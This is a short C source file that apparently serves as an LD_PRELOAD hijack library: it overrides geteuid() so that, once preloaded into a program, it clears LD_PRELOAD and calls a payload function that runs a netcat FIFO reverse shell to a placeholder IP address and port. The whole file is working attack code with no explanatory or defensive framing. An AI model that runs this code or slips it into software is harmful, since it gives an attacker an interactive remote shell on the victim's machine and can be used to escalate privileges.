#include <stdlib.h>
#include <stdio.h>
#include <string.h>
void payload() {
system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [IP_ADDRESS] [PORT] >/tmp/f");
}
int geteuid() {
if (getenv("LD_PRELOAD") == NULL) { return 0; }
unsetenv("LD_PRELOAD");
payload();
}
